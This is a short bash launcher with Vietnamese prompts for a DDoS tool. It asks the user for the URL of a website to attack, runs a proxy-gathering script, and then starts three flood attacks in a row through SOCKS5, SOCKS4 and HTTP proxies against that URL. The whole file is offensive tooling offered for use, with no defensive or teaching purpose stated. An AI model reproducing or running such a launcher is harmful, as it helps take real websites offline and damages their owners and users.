#!/bin/bash
echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
echo Nhap URL trang web can tan cong:
read URL
PROXY="./proxies/"
VERIFY=""
python3 proxy.py
export URL PROXY VERIFY
./socks5.sh "$URL" "$PROXY" "$VERIFY" && ./socks4.sh "$URL" "$PROXY" "$VERIFY" && ./http.sh "$URL" "$PROXY" "$VERIFY"